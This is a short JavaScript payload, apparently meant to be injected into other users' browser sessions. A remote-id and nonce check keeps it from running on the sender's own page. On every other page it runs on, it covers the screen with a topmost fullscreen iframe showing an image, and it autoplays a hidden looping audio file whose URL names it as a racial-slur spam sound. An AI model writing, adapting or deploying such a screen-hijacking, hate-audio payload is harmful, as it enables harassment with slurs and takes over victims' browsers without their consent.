const [id, nonce] = new URL(import.meta.url).search.slice(1).split('-').map(Number);
const skip = globalThis.localRemoteId === id &&
             globalThis.selfImportNonce === nonce;

if (!skip) {
    const IMAGE_URL = 'https://pngimg.com/uploads/minions/minions_PNG81.png';
    const AUDIO_URL = 'https://github.com/lilbladez/a/raw/refs/heads/main/N%20WORD%20SPAM%20SOUND%20EFFECT%20(320kbps).mp3';
    const FRAME_ID = 'nova-fullscreen-image-browser';
    const AUDIO_ID = 'nova-looping-audio';

    try {
        const url = new URL(IMAGE_URL);
        if (url.protocol !== 'https:' && url.protocol !== 'http:') {
            throw new Error('Image URL must use HTTPS or HTTP');
        }

        const previous = document.getElementById(FRAME_ID);
        if (previous) previous.remove();

        const frame = document.createElement('iframe');
        frame.id = FRAME_ID;
        frame.title = 'Fullscreen image';
        frame.setAttribute('aria-label', 'Fullscreen image');
        frame.style.cssText =
            'position:fixed;inset:0;width:100vw;height:100vh;' +
            'border:0;margin:0;padding:0;z-index:2147483647;background:#000;';

        const safeUrl = url.href.replace(/&/g, '&amp;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
        frame.srcdoc = '<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head>' +
            '<body style="margin:0;width:100vw;height:100vh;overflow:hidden;background:#000">' +
            '<img src="' + safeUrl + '" alt="" style="display:block;width:100%;height:100%;object-fit:contain">' +
            '</body></html>';

        document.documentElement.appendChild(frame);
    } catch (error) {
        console.error('[IMAGE_BROWSER] Could not create image overlay:', error);
    }

    if (AUDIO_URL) {
        try {
            const audioUrl = new URL(AUDIO_URL);
            if (audioUrl.protocol !== 'https:' && audioUrl.protocol !== 'http:') {
                throw new Error('Audio URL must use HTTPS or HTTP');
            }

            const previousAudio = document.getElementById(AUDIO_ID);
            if (previousAudio) {
                previousAudio.pause();
                previousAudio.remove();
            }

            const audio = document.createElement('audio');
            audio.id = AUDIO_ID;
            audio.setAttribute('src', audioUrl.href);
            audio.setAttribute('loop', '');
            audio.setAttribute('preload', 'auto');
            audio.setAttribute('style', 'display:none');
            document.documentElement.appendChild(audio);

            const playback = audio.play();
            if (playback && typeof playback.catch === 'function') {
                playback.catch(error => console.error('[IMAGE_BROWSER] Audio playback failed:', error));
            }
        } catch (error) {
            console.error('[IMAGE_BROWSER] Could not create looping audio:', error);
        }
    }
}
